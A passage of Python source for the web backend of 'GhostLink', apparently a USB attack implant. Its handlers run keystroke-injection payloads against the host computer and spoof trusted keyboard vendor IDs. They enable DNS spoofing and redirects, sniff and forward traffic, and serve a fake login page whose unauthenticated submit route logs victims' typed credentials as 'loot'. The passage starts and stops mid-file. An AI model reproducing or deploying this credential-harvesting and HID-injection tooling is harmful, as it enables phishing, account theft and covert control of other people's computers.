                f.write(f"{time.strftime('%H:%M:%S')} webui 302 Host={host} path={self.path} -> {loc}\n")
        except Exception: pass
        return True

    def do_GET(self):
        if self._maybe_redirect(): return
        u = urlparse(self.path); p = u.path
        if p == "/" or p == "/index.html":  self._send(200, "text/html; charset=utf-8", HTML)
        elif p == "/style.css":              self._send(200, "text/css", CSS)
        elif p == "/app.js":                 self._send(200, "application/javascript", JS)
        elif p == "/api/status":
            cfg = load_cfg()
            recs = len(list(REC_DIR.glob("rec_*.pcap"))) if REC_DIR.exists() else 0
            self._send_json({
                "name": cfg.get("DEVICE_NAME","WebBee-Ghost"),
                "hostname": cfg.get("HOSTNAME","ghostlink"),
                "sniff_iface": cfg.get("SNIFF_IFACE","usb0"),
                "record_pcap": cfg.get("RECORD_PCAP","TRUE").upper()=="TRUE",
                "verdict": cfg.get("VERDICT_STREAM","TRUE").upper()=="TRUE",
                "redirect": cfg.get("REDIRECT","FALSE").upper()=="TRUE",
                "hid": cfg.get("ENABLE_HID","FALSE").upper()=="TRUE",
                "records_count": recs, "free_mb": self._free_mb(),
                "cfg_gen": int(CFG_PATH.stat().st_mtime) if CFG_PATH.exists() else 0,
                "uptime": uptime_str(),
            })
        elif p == "/api/live":
            st = read_stats(); st["ifaces"] = ifaces_snapshot(); st["tail"] = tail_verdicts(50)
            if "free_mb" not in st: st["free_mb"] = self._free_mb()
            self._send_json(st)
        elif p == "/api/config":
            self._send(200, "text/plain", CFG_PATH.read_text() if CFG_PATH.exists() else "")
        elif p == "/api/records":
            out = []
            for d, pat in ((REC_DIR,"*.pcap"), (VER_DIR,"*.jsonl")):
                if not d.exists(): continue
                for f in d.iterdir():
                    try: st = f.stat(); out.append({"name": f.name,"size": st.st_size,"mtime": int(st.st_mtime)})
                    except Exception: pass
            self._send_json(out)
        elif p == "/api/payloads":
            d = ROOT/"payloads"; out = []
            if d.exists():
                for f in d.iterdir():
                    if f.is_file() and f.suffix in (".ducky",".txt"): out.append(f.name)
            self._send_json(sorted(out))
        elif p == "/api/leases": self._send_json(read_dhcp_leases())
        elif p == "/api/log":    self._send(200, "text/plain", tail_file(LOG_PATH, 40))
        elif p.startswith("/api/download/"):
            name = p[len("/api/download/"):]
            if not re.match(r"^rec_\d{6}\.(pcap|jsonl)$", name):
                return self._send(400, "text/plain", "bad name")
            d = REC_DIR if name.endswith(".pcap") else VER_DIR
            fp = d / name
            if not fp.exists(): return self._send(404, "text/plain", "not found")
            self._send(200, "application/octet-stream", fp.read_bytes(),
                       extra={"Content-Disposition": f'attachment; filename="{name}"'})
        elif p == "/api/query":
            qs = parse_qs(u.query)
            host = qs.get("host", [""])[0].lower()
            rule = qs.get("rule", [""])[0].upper()
            files = sorted(VER_DIR.glob("rec_*.jsonl"),
                           key=lambda p: p.stat().st_mtime, reverse=True) if VER_DIR.exists() else []
            lines = []
            for f in files[:4]:
                try:
                    for ln in f.read_text().splitlines():
                        if host and host not in ln.lower(): continue
                        if rule and f'"rule":"{rule}"' not in ln: continue
                        lines.append(ln)
                        if len(lines) >= 500: break
                except Exception: pass
                if len(lines) >= 500: break
            self._send(200, "application/x-ndjson", "\n".join(lines))
        elif p == "/api/scripts":
            # list scripts under PAY_DIR
            out = []
            PAY_DIR.mkdir(parents=True, exist_ok=True)
            for f in PAY_DIR.iterdir():
                if not f.is_file(): continue
                try:
                    st = f.stat()
                    out.append({"name": f.name, "size": st.st_size, "mtime": int(st.st_mtime)})
                except Exception: pass
            out.sort(key=lambda x: x["name"])
            self._send_json(out)
        elif p.startswith("/api/scripts/"):
            name = p[len("/api/scripts/"):]
            if not SCRIPT_NAME_RE.match(name):
                return self._send(400, "text/plain", "bad script name")
            fp = PAY_DIR / name
            if not fp.exists():
                return self._send(404, "text/plain", "not found")
            try: body = fp.read_text(encoding="utf-8", errors="replace")
            except Exception as e:
                return self._send(500, "text/plain", f"read err: {e}")
            self._send(200, "text/plain; charset=utf-8", body)
        elif p == "/api/layouts":
            out = []
            if LAY_DIR.exists():
                for f in sorted(LAY_DIR.iterdir()):
                    if f.suffix == ".json": out.append(f.stem)
            self._send_json(out)
        elif p == "/api/net/link":
            # Snapshot of each iface's carrier so the Live UI can decide if
            # "Forwarded Traffic" is available right now (eth0 cable plugged
            # in). Reads straight from sysfs, no root helper needed.
            out = {}
            for ifn in ("eth0", "usb0"):
                base = Path(f"/sys/class/net/{ifn}")
                if not base.exists(): continue
                def _r(name, default="?"):
                    try: return (base / name).read_text().strip()
                    except Exception: return default
                carrier = _r("carrier", "0")
                try: carrier = int(carrier)
                except Exception: carrier = 0
                try: speed = int(_r("speed", "-1"))
                except Exception: speed = -1
                out[ifn] = {
                    "carrier":   bool(carrier),
                    "operstate": _r("operstate", "unknown"),
                    "speed":     speed,
                    "mac":       _r("address", ""),
                }
            cfg = load_cfg()
            out["mode"] = cfg.get("NET_MODE", "PASSIVE").upper()
            out["forwarder_running"] = bool(
                any("forwarder.py" in ln for ln in
                    subprocess.run(["ps"], capture_output=True, text=True, timeout=2)
                              .stdout.splitlines())
            )
            self._send_json(out)
        elif p == "/api/clone/hosts":
            # Return every host currently in the DHCP lease DB, enriched
            # with OEM lookup + a quick OS guess, so the Clone tab can
            # offer a "clone this host" button for each one.
            leases = read_dhcp_leases()
            now = int(time.time())
            out = []
            for L in leases:
                exp = L.get("expires", 0) or 0
                mac = L.get("mac") or ""
                hn  = L.get("host") or ""
                out.append({
                    "mac":      mac,
                    "ip":       L.get("ip") or "",
                    "hostname": hn,
                    "vendor":   _oui_vendor(mac),
                    "os":       _fingerprint_os(mac, hn),
                    "expires":  exp,
                    "active":   bool(exp == 0 or exp > now),
                })
            self._send_json(out)
        elif p == "/api/net/internet":
            self._send_json(_check_internet())
        elif p == "/api/honeypot/index":
            # Return the current uploaded HTML (or the bundled default)
            try: html = HONEY_HTML.read_text(encoding="utf-8") if HONEY_HTML.exists() else DEFAULT_HONEYPOT_HTML
            except Exception: html = DEFAULT_HONEYPOT_HTML
            self._send(200, "text/html; charset=utf-8", html)
        elif p == "/api/honeypot/status":
            cfg = load_cfg()
            custom = HONEY_HTML.exists()
            loot_n = 0
            if HONEY_LOOT.exists():
                try: loot_n = sum(1 for _ in HONEY_LOOT.open())
                except Exception: pass
            # Is the honeypot IP currently bound to the iface?
            hp_ip = (cfg.get("HONEYPOT_IP","") or "").strip()
            ip_bound = False
            iface = cfg.get("DNSMASQ_IFACE","usb0") or "usb0"
            try:
                r = subprocess.run(["ip","-o","addr","show","dev",iface],
                                   capture_output=True, text=True, timeout=2)
                ip_bound = bool(hp_ip and hp_ip in r.stdout)
            except Exception: pass
            self._send_json({
                "enabled":        cfg.get("HONEYPOT","FALSE").upper()=="TRUE",
                "custom_html":    custom,
                "html_size":      HONEY_HTML.stat().st_size if custom else len(DEFAULT_HONEYPOT_HTML),
                "redirect_after": cfg.get("HONEYPOT_REDIRECT_AFTER",""),
                "rules_text":     cfg.get("HONEYPOT_RULES",""),
                "rules_parsed":   _honeypot_rules(cfg),
                "loot_count":     loot_n,
                "redirect_from":  cfg.get("REDIRECT_FROM",""),
                "ip":             hp_ip,
                "iface":          iface,
                "ip_bound":       ip_bound,
                "url":            f"http://{hp_ip}/" if hp_ip else "",
            })
        elif p == "/api/honeypot/loot":
            out = []
            if HONEY_LOOT.exists():
                try:
                    with open(HONEY_LOOT) as f:
                        for ln in f:
                            try: out.append(json.loads(ln))
                            except Exception: pass
                except Exception: pass
            # newest first, cap at 500
            out.reverse()
            self._send_json(out[:500])
        elif p == "/api/clone/identity":
            # Returns the current override values (if any) plus whether S50
            # is actually sourcing them (patched).
            d = {}
            if ID_ENV.exists():
                try:
                    for ln in ID_ENV.read_text().splitlines():
                        ln = ln.strip()
                        if not ln or ln.startswith("#") or "=" not in ln: continue
                        k, v = ln.split("=", 1)
                        if k.startswith("USB_"):
                            d[k[4:]] = v.strip().strip('"').strip("'")
                except Exception: pass
            # Is S50 patched to source our file?
            patched = False
            try:
                s50 = Path("/etc/init.d/S50usbdevice").read_text()
                patched = "ghostlink identity.env" in s50
            except Exception: pass
            self._send_json({"identity": d, "active": bool(d) and patched, "s50_patched": patched})
        elif p == "/api/extensions":
            out = []
            EXT_DIR.mkdir(parents=True, exist_ok=True)
            for f in sorted(EXT_DIR.iterdir()):
                if not f.is_file() or f.suffix != ".ducky": continue
                try:
                    st = f.stat()
                    out.append({"name": f.stem, "size": st.st_size, "mtime": int(st.st_mtime)})
                except Exception: pass
            self._send_json(out)
        elif p.startswith("/api/extensions/"):
            name = p[len("/api/extensions/"):]
            if not re.match(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$", name):
                return self._send(400, "text/plain", "bad name")
            fp = EXT_DIR / f"{name}.ducky"
            if not fp.exists():
                return self._send(404, "text/plain", "not found")
            try: self._send(200, "text/plain; charset=utf-8", fp.read_text(encoding="utf-8", errors="replace"))
            except Exception as e: self._send(500, "text/plain", f"read err: {e}")
        elif p == "/api/auth/me":
            u = self._auth_user()
            self._send_json({"authed": bool(u), "user": u or None})
        elif p == "/xterm.js":
            self._send_file_or_404(ROOT / "web" / "xterm.js", "application/javascript")
        elif p == "/xterm.css":
            self._send_file_or_404(ROOT / "web" / "xterm.css", "text/css")
        elif p == "/xterm-addon-fit.js":
            self._send_file_or_404(ROOT / "web" / "xterm-addon-fit.js", "application/javascript")
        elif p == "/api/cli/stream":
            # Server-Sent Events: continuously stream pty master fd bytes to
            # the browser. One event per read, base64-encoded so binary
            # (escape sequences, color codes) survives transport.
            if not self._auth_user():
                return self._send(401, "text/plain", "auth required\n")
            tok = self._session_key()
            if not tok:
                return self._send(401, "text/plain", "no session\n")
            self._cli_stream(tok)
        else:
            self._send(404, "text/plain", "not found\n")

    def do_POST(self):
        if self._maybe_redirect(): return
        u = urlparse(self.path)

        # Lightweight CSRF guard. Reject if an Origin/Referer is present and
        # does NOT point at our own origin. A page the admin was redirected
        # to can't then fetch('http://172.32.0.93/api/reboot') and nuke the
        # device. Requests from our own UI either omit Origin (same-origin
        # fetch in some browsers) or set it to our Host — both pass.
        origin = self.headers.get("Origin") or self.headers.get("Referer") or ""
        host   = (self.headers.get("Host") or "").split(":")[0].strip().lower()
        if origin:
            try:
                oh = urlparse(origin).hostname or ""
                if oh.lower() not in (host, "172.32.0.93", "ghostlink.local",
                                      "localhost", "127.0.0.1"):
                    return self._send(403, "text/plain", "cross-origin blocked\n")
            except Exception:
                return self._send(400, "text/plain", "bad origin\n")

        try: n = int(self.headers.get("Content-Length") or 0)
        except ValueError: n = 0
        # cap request bodies at 256 KB. config.txt is < 4 KB in practice; a
        # bigger body is either malformed or an attempt to fill flash via
        # /api/config POST — refuse early rather than reading it all.
        if n > 256 * 1024:
            return self._send(413, "text/plain", "payload too large\n")
        body = self.rfile.read(n) if n else b""
        if u.path == "/api/config":
            # Only reload dnsmasq if a DHCP/DNS/REDIRECT key actually
            # changed. Flipping ENABLE_HID or BUTTON_PAYLOAD does NOT need
            # a reload, and the 0.3-0.8 s dnsmasq restart gap was long
            # enough to make the admin's PC lose its DHCP lease on some
            # boots — "device becomes unreachable sometimes" after any
            # unrelated config edit. Compare old vs new K=V pairs on
            # a fixed key list and only reload when one of those changed.
            NET_KEYS = ("DNSMASQ", "DNSMASQ_IFACE", "DHCP_RANGE",
                        "DNS_UPSTREAM", "REDIRECT", "REDIRECT_FROM",
                        "REDIRECT_TO", "DNS_SPOOF", "DNS_SPOOF_HOSTS",
                        "HONEYPOT_RULES")
            HP_KEYS  = ("HONEYPOT", "HONEYPOT_IP", "DNSMASQ_IFACE")
            old = load_cfg()
            tmp = CFG_PATH.with_suffix(".new")
            tmp.write_bytes(body); tmp.replace(CFG_PATH)
            new = load_cfg()
            need_reload = any(old.get(k, "") != new.get(k, "") for k in NET_KEYS)
            if need_reload:
                try: subprocess.run(["sh", str(ROOT/"ghostlink.sh"), "reload-dnsmasq"],
                                    timeout=5, capture_output=True)
                except Exception: pass
            # Add/remove the honeypot's secondary IP if HONEYPOT or its IP changed.
            if any(old.get(k, "") != new.get(k, "") for k in HP_KEYS):
                # If HONEYPOT_IP itself changed, strip the OLD one first so we
                # don't leave an orphan secondary address on the iface.
                if old.get("HONEYPOT_IP") and old.get("HONEYPOT_IP") != new.get("HONEYPOT_IP"):
                    try:
                        iface = old.get("DNSMASQ_IFACE","usb0") or "usb0"
                        subprocess.run(["ip","addr","del",
                                        f"{old['HONEYPOT_IP']}/16","dev",iface],
                                       capture_output=True, timeout=3)
                    except Exception: pass
                _honeypot_apply_ip(new)
            # NOTE: HID gadget rebind is intentionally NOT triggered here. On
            # the Luckfox RV1106 stock gadget, writing to UDC tears down
            # ffs.adb (FunctionFS backed by adbd); adbd does not survive the
            # rebind, so the entire composite gadget — RNDIS + HID + ADB —
            # fails to come back up. The device appears bricked over USB
            # until a physical power-cycle. The safe rebind requires
            # orchestrating adbd across the UDC flap; see HID.md for the
            # SSH-watchdog procedure, which is the only approved path.
            return self._send_json({"ok": True})
        if u.path == "/api/clear":
            removed = 0
            for d, pat in ((REC_DIR,"*.pcap"), (VER_DIR,"*.jsonl")):
                if not d.exists(): continue
                for f in d.iterdir():
                    try: f.unlink(); removed += 1
                    except Exception: pass
            return self._send_json({"ok": True, "removed": removed})
        if u.path == "/api/delete":
            try: data = json.loads(body)
            except Exception: data = {}
            name = data.get("name","")
            if not re.match(r"^rec_\d{6}\.(pcap|jsonl)$", name):
                return self._send_json({"ok": False, "reason":"bad name"}, code=400)
            d = REC_DIR if name.endswith(".pcap") else VER_DIR
            try: (d/name).unlink(); return self._send_json({"ok": True})
            except Exception as e: return self._send_json({"ok": False, "err": str(e)}, code=500)
        if u.path == "/api/hid":
            payload = body.decode("utf-8","replace").strip()
            if not payload: return self._send_json({"ok": False}, code=400)
            # Constrain to files under /root/ghostlink/payloads. Reject
            # absolute paths that would escape (e.g. /etc/shadow) and
            # resolve ../ segments.
            pay_root = (ROOT / "payloads").resolve()
            if payload.startswith("/"):
                target = Path(payload).resolve()
            else:
                target = (pay_root / payload).resolve()
            try: target.relative_to(pay_root)
            except ValueError:
                return self._send_json({"ok": False, "reason": "payload must be under /root/ghostlink/payloads"}, code=403)
            if not target.is_file():
                return self._send_json({"ok": False, "reason": "not found"}, code=404)
            ok = subprocess.call(["python3", str(ROOT/"ducky.py"), str(target)]) == 0
            return self._send_json({"ok": ok}, code=200 if ok else 500)
        if u.path == "/api/reboot":
            self._send_json({"ok": True})
            threading.Thread(target=lambda: (time.sleep(1), os.system("reboot"))).start()
            return

        # ---- run temporary (unsaved) DuckyScript -------------------------
        # Must come BEFORE the generic /api/scripts/<name> save handler so
        # the "_runtemp" path doesn't get name-validated as a save target.
        if u.path == "/api/scripts/_runtemp":
            if len(body) > 128 * 1024:
                return self._send_json({"ok": False, "err": "too large"}, code=413)
            if not body.strip():
                return self._send_json({"ok": False, "err": "empty"}, code=400)
            tmp = Path("/tmp") / f"gl_tmp_{os.getpid()}_{int(time.time()*1000)}.ducky"
            try:
                tmp.write_bytes(body)
                rc = subprocess.call(["python3", str(ROOT/"ducky.py"), str(tmp)])
                return self._send_json({"ok": rc == 0, "rc": rc},
                                       code=200 if rc == 0 else 500)
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)
            finally:
                try: tmp.unlink()
                except Exception: pass

        # ---- clone: write / clear identity override ---------------------
        # ---- Clone a specific DHCP-connected host as gadget identity ----
        # The user picked a row from the Clone tab's "connected hosts"
        # list. Build a plausible USB identity from it: Microsoft/Apple/etc
        # VID/PID presets based on the OUI vendor, hostname → serial.
        if u.path == "/api/clone/host_apply":
            try: data = json.loads(body)
            except Exception: data = {}
            mac = (data.get("mac") or "").strip()
            hostname = (data.get("hostname") or "").strip()
            if not mac and not hostname:
                return self._send_json({"ok": False, "err": "need mac or hostname"}, code=400)
            vendor = _oui_vendor(mac)
            # Pick a credible gadget identity to spoof. These are real,
            # commonly-trusted VID/PID combos for benign HID / RNDIS
            # devices. The gadget will enumerate as this; it does not
            # mean the device BECOMES that product.
            PRESETS = {
                "Apple":              ("0x05ac", "0x024f", "Apple",   "Internal Keyboard"),
                "Microsoft (Surface)":("0x045e", "0x0750", "Microsoft","Wired Keyboard 600"),
                "Lenovo":             ("0x17ef", "0x6009", "Lenovo",  "USB Keyboard"),
                "Dell":               ("0x413c", "0x2113", "Dell",    "KB216 Wired Keyboard"),
                "HP":                 ("0x03f0", "0x0024", "HP",      "Basic USB Keyboard"),
                "ASUS":               ("0x0b05", "0x1869", "ASUS",    "USB Keyboard"),
                "Intel":              ("0x8087", "0x0032", "Intel",   "Wireless Bluetooth"),
                "Raspberry Pi":       ("0x2e8a", "0x0003", "Raspberry Pi","Pico Keyboard"),
                "VMware":             ("0x0e0f", "0x0003", "VMware",  "Virtual Mouse"),
                "VirtualBox":         ("0x80ee", "0x0021", "innotek", "VBox USB Tablet"),
            }
            vid, pid, mfr, prod = PRESETS.get(vendor,
                ("0x1d6b", "0x0104", "GhostLink", "Composite Device"))
            # Serial: last 6 hex of MAC, or hostname sanitised.
            def _clean(s, n=64):
                s = re.sub(r"[\x00-\x1f\x7f\"\'\\`$]", "", str(s or ""))
                return s.strip()[:n]
            ser = _clean(mac.replace(":", "").replace("-", "").upper()[-6:] or hostname, 32)
            prod_out = _clean(hostname, 64) or prod
            lines = [
                "# GhostLink identity override — generated by Clone-host.",
                f"# Cloned from mac={mac} hostname={hostname} vendor={vendor or 'unknown'}",
                f'USB_VID="{vid}"',
                f'USB_PID="{pid}"',
                f'USB_MFR="{mfr}"',
                f'USB_PROD="{prod_out}"',
                f'USB_SER="{ser}"',
            ]
            try:
                tmp = ID_ENV.with_suffix(".new")
                tmp.write_text("\n".join(lines) + "\n")
                tmp.replace(ID_ENV)
                return self._send_json({
                    "ok": True,
                    "identity": {"VID": vid, "PID": pid, "MFR": mfr,
                                 "PROD": prod_out, "SER": ser,
                                 "from_vendor": vendor},
                })
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        # ---- Honeypot: upload a custom index.html -----------------------
        if u.path == "/api/honeypot/index":
            if len(body) > 256 * 1024:
                return self._send_json({"ok": False, "err": "html too large"}, code=413)
            HONEY_DIR.mkdir(parents=True, exist_ok=True)
            try:
                tmp = HONEY_HTML.with_suffix(".new")
                tmp.write_bytes(body); tmp.replace(HONEY_HTML)
                return self._send_json({"ok": True, "size": HONEY_HTML.stat().st_size})
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        # ---- Honeypot: form-capture target (victim POSTs here) ----------
        # This is intentionally OUTSIDE the auth guard. The victim's browser
        # is NOT logged in — we just want to capture whatever they typed
        # into the fake form, log it, and bounce them to the redirect URL
        # (or back to the real site).
        if u.path == "/_honeypot_submit":
            cfg = load_cfg()
            # Parse either JSON (preferred, our form-shim) or urlencoded form
            fields = {}
            ct = (self.headers.get("Content-Type") or "").lower()
            try:
                if "json" in ct:
                    fields = json.loads(body) if body else {}
                else:
                    for k, v in parse_qs(body.decode("utf-8", "replace")).items():
                        fields[k] = v[0] if v else ""
            except Exception:
                fields = {}
            # Build the loot record
            rec = {
                "t":    int(time.time()),
                "ts":   time.strftime("%Y-%m-%d %H:%M:%S"),
                "ip":   self._client_ip(),
                "host": (self.headers.get("Host") or "").split(":")[0],
                "ua":   self.headers.get("User-Agent", "")[:200],
                "ref":  self.headers.get("Referer", "")[:200],
                "data": {k: str(v)[:512] for k, v in fields.items()
                         if not k.startswith("_")},
            }
            try:
                HONEY_DIR.mkdir(parents=True, exist_ok=True)
                with open(HONEY_LOOT, "a") as f:
                    f.write(json.dumps(rec) + "\n")
            except Exception: pass
            # Emit a CRED verdict so Live tab lights up red
            try:
                values = " ".join(f"{k}={str(v)[:40]}" for k, v in rec["data"].items())
                _honeypot_emit_verdict({
                    "ts":   rec["ts"],
                    "rule": "HONEYPOT_CRED",
                    "host": rec["host"],
                    "ip":   rec["ip"],
                    "detail": f"UA={rec['ua'][:80]} :: {values}",
                })
            except Exception: pass
            try:
                with open(LOG_PATH, "a") as f:
                    f.write(f"{time.strftime('%H:%M:%S')} honeypot CRED host={rec['host']} ip={rec['ip']} fields={list(rec['data'].keys())}\n")
            except Exception: pass
            # Where to send the victim: explicit redirect wins, else parsed
            # rule DSL ON SIGN_IN REDIRECT_TO <url>, else back to host.
            to = cfg.get("HONEYPOT_REDIRECT_AFTER", "").strip()
            if not to:
                for rule in _honeypot_rules(cfg):
                    if rule.get("trigger") == "SIGN_IN" and rule.get("to"):
                        to = rule["to"]; break
            if not to:
                to = f"https://{rec['host']}/" if rec["host"] else "/"
            return self._send_json({"ok": True, "to": to})

        # ---- Honeypot: delete captured loot (clear log) -----------------
        if u.path == "/api/honeypot/loot_clear":
            try:
                if HONEY_LOOT.exists(): HONEY_LOOT.unlink()
                return self._send_json({"ok": True})
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        if u.path == "/api/clone/identity":
            try: data = json.loads(body)
            except Exception: data = {}
            # Validate: VID/PID must be hex-ish or empty; strings sanitized
            # for shell inclusion (strip quotes/backticks/dollar/newlines)
            def _clean(s, n=64):
                s = (str(s) if s is not None else "").strip()
                s = re.sub(r"[\x00-\x1f\x7f\"\'\\`$]", "", s)
                return s[:n]
            vid  = _clean(data.get("VID"), 10)
            pid  = _clean(data.get("PID"), 10)
            mfr  = _clean(data.get("MFR"), 64)
            prod = _clean(data.get("PROD"), 64)
            ser  = _clean(data.get("SER"), 32)
            if vid and not re.match(r"^(0x)?[0-9A-Fa-f]{1,4}$", vid):
                return self._send_json({"ok": False, "err": "VID must be hex (e.g. 0x05ac)"}, code=400)
            if pid and not re.match(r"^(0x)?[0-9A-Fa-f]{1,4}$", pid):
                return self._send_json({"ok": False, "err": "PID must be hex"}, code=400)
            if vid and not vid.lower().startswith("0x"): vid = "0x" + vid
            if pid and not pid.lower().startswith("0x"): pid = "0x" + pid
            lines = [
                "# GhostLink identity override — sourced by patched S50usbdevice at boot.",
                "# Delete or clear fields to restore the stock Rockchip identity.",
            ]
            if vid:  lines.append(f'USB_VID="{vid}"')
            if pid:  lines.append(f'USB_PID="{pid}"')
            if mfr:  lines.append(f'USB_MFR="{mfr}"')
            if prod: lines.append(f'USB_PROD="{prod}"')
            if ser:  lines.append(f'USB_SER="{ser}"')
            try:
                tmp = ID_ENV.with_suffix(".new")
                tmp.write_text("\n".join(lines) + "\n")
                tmp.replace(ID_ENV)
                return self._send_json({"ok": True})
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        # ---- flip network mode (passive / forward) ----------------------
        if u.path == "/api/net/mode":
            try: data = json.loads(body)
            except Exception: data = {}
            mode = (data.get("mode") or "").upper()
            if mode not in ("PASSIVE", "FORWARD"):
                return self._send_json({"ok": False, "err": "mode must be PASSIVE or FORWARD"}, code=400)
            # update config.txt line atomically
            txt = CFG_PATH.read_text() if CFG_PATH.exists() else ""
            if re.search(r"^NET_MODE=.*$", txt, re.MULTILINE):
                txt = re.sub(r"^NET_MODE=.*$", f"NET_MODE={mode}", txt, flags=re.MULTILINE)
            else:
                txt += ("" if txt.endswith("\n") else "\n") + f"NET_MODE={mode}\n"
            tmp = CFG_PATH.with_suffix(".new")
            tmp.write_text(txt); tmp.replace(CFG_PATH)
            # ask the link watcher to react immediately: if FORWARD and
            # eth0 up, start the forwarder; if PASSIVE, kill it.
            if mode == "FORWARD":
                carrier = "0"
                try: carrier = Path("/sys/class/net/eth0/carrier").read_text().strip()
                except Exception: pass
                if carrier == "1":
                    try:
                        subprocess.run(["ip", "link", "set", "eth0", "up"], timeout=2)
                        subprocess.run(["ip", "link", "set", "eth0", "promisc", "on"], timeout=2)
                        subprocess.Popen(["python3", str(ROOT/"forwarder.py"), "eth0", "usb0"])
                    except Exception: pass
            else:
                # kill forwarder if running
                try:
                    r = subprocess.run(["ps"], capture_output=True, text=True, timeout=2)
                    for ln in r.stdout.splitlines():
                        if "forwarder.py" in ln and "grep" not in ln:
                            parts = ln.split()
                            if parts and parts[0].isdigit():
                                try: os.kill(int(parts[0]), 15)
                                except Exception: pass
                except Exception: pass
            return self._send_json({"ok": True, "mode": mode})

        # ---- extensions library (save) ----------------------------------
        if u.path.startswith("/api/extensions/"):
            name = u.path[len("/api/extensions/"):]
            if not re.match(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$", name):
                return self._send_json({"ok": False, "err": "bad name"}, code=400)
            if len(body) > 128 * 1024:
                return self._send_json({"ok": False, "err": "too large"}, code=413)
            EXT_DIR.mkdir(parents=True, exist_ok=True)
            fp = EXT_DIR / f"{name}.ducky"
            tmp = fp.with_suffix(".new")
            try:
                tmp.write_bytes(body); tmp.replace(fp)
                return self._send_json({"ok": True, "size": fp.stat().st_size})
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        # ---- scripts library (save) --------------------------------------
        if u.path.startswith("/api/scripts/") and not u.path.endswith("/rename") and not u.path.endswith("/run"):
            name = u.path[len("/api/scripts/"):]
            if not SCRIPT_NAME_RE.match(name):
                return self._send_json({"ok": False, "err": "bad script name"}, code=400)
            PAY_DIR.mkdir(parents=True, exist_ok=True)
            # cap at 128 KB
            if len(body) > 128 * 1024:
                return self._send_json({"ok": False, "err": "too large"}, code=413)
            fp = PAY_DIR / name
            tmp = fp.with_suffix(fp.suffix + ".new")
            try:
                tmp.write_bytes(body); tmp.replace(fp)
                if name.endswith(".sh"):
                    try: os.chmod(fp, 0o755)
                    except Exception: pass
                return self._send_json({"ok": True, "size": fp.stat().st_size})
            except Exception as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        # ---- scripts library (rename) ------------------------------------
        if u.path.endswith("/rename") and u.path.startswith("/api/scripts/"):
            old = u.path[len("/api/scripts/"):-len("/rename")]
            try: data = json.loads(body)
            except Exception: data = {}
            new = data.get("new", "")
            if not SCRIPT_NAME_RE.match(old) or not SCRIPT_NAME_RE.match(new):
                return self._send_json({"ok": False, "err": "bad name"}, code=400)
            op = PAY_DIR / old; np = PAY_DIR / new
            if not op.exists():
                return self._send_json({"ok": False, "err": "not found"}, code=404)
            if np.exists():
                return self._send_json({"ok": False, "err": "target exists"}, code=409)
            try: op.rename(np); return self._send_json({"ok": True})
            except Exception as e: return self._send_json({"ok": False, "err": str(e)}, code=500)

        # ---- scripts library (run) ---------------------------------------
        if u.path.endswith("/run") and u.path.startswith("/api/scripts/"):
            name = u.path[len("/api/scripts/"):-len("/run")]
            if not SCRIPT_NAME_RE.match(name):
                return self._send_json({"ok": False, "err": "bad name"}, code=400)
            fp = PAY_DIR / name
            if not fp.exists():
                return self._send_json({"ok": False, "err": "not found"}, code=404)
            if name.endswith(".ducky") or name.endswith(".txt") or name.endswith(".dd"):
                rc = subprocess.call(["python3", str(ROOT/"ducky.py"), str(fp)])
            elif name.endswith(".sh"):
                rc = subprocess.call(["sh", str(fp)])
            else:
                return self._send_json({"ok": False, "err": "unknown type"}, code=400)
            return self._send_json({"ok": rc == 0, "rc": rc}, code=200 if rc == 0 else 500)

        # ---- stop any running payload ------------------------------------
        if u.path == "/api/hid/stop":
            killed = 0
            try:
                r = subprocess.run(["ps"], capture_output=True, text=True, timeout=2)
                for ln in r.stdout.splitlines():
                    if "ducky.py" in ln and "grep" not in ln:
                        parts = ln.split()
                        if parts and parts[0].isdigit():
                            try: os.kill(int(parts[0]), 15); killed += 1
                            except Exception: pass
            except Exception: pass
            return self._send_json({"ok": True, "killed": killed})

        # ---- live key (one HID report + release) -------------------------
        if u.path == "/api/live/key":
            try: data = json.loads(body)
            except Exception: data = {}
            mod = int(data.get("mod", 0)) & 0xFF
            keys = data.get("keys") or ([data["key"]] if "key" in data else [])
            # cap to 6 simultaneous keys per boot keyboard protocol
            keys = [int(k) & 0xFF for k in keys][:6]
            buf = bytes([mod, 0] + keys + [0] * (6 - len(keys)))
            rel = bytes(8)
            try:
                fd = os.open("/dev/hidg0", os.O_RDWR)
                os.write(fd, buf); os.write(fd, rel); os.close(fd)
                return self._send_json({"ok": True})
            except OSError as e:
                return self._send_json({"ok": False, "err": str(e)}, code=500)

        # ---- auth: login / logout ----------------------------------------
        if u.path == "/api/auth/login":
            ip = self._client_ip()
            if _login_throttled(ip):
                return self._send_json({"ok": False, "err": "throttled"}, code=429)
            try: data = json.loads(body)
            except Exception: data = {}
            cfg = load_cfg()
            expect_user = cfg.get("WEBUI_USER", "root")
            expect_pass = cfg.get("WEBUI_PASS", "ghostlink")
            u_in = data.get("user", "")
            p_in = data.get("pass", "")
            if secrets.compare_digest(u_in, expect_user) and secrets.compare_digest(p_in, expect_pass):
                tok = _session_new(u_in)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                # 1h cookie; HttpOnly stops JS exfiltration; Path=/ scopes all routes.
                self.send_header("Set-Cookie", f"gl_sess={tok}; HttpOnly; Path=/; Max-Age={SESSION_TTL}; SameSite=Strict")
                b = json.dumps({"ok": True, "user": u_in}).encode()
                self.send_header("Content-Length", str(len(b)))
                self.end_headers(); self.wfile.write(b)
                return
            _login_record(ip)
            try:
                with open(LOG_PATH, "a") as f:
                    f.write(f"{time.strftime('%H:%M:%S')} webui login FAIL from {ip} user={u_in[:16]}\n")
            except Exception: pass
            return self._send_json({"ok": False, "err": "bad credentials"}, code=401)

        if u.path == "/api/auth/logout":
            tok = self._cookie_token()
            if tok:
                pty_close(tok)
                _session_drop(tok)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Set-Cookie", "gl_sess=; Path=/; Max-Age=0; SameSite=Strict")
            b = b'{"ok":true}'
            self.send_header("Content-Length", str(len(b)))
            self.end_headers(); self.wfile.write(b)
            return

        # ---- CLI exec: persistent pty-backed shell per session -----------
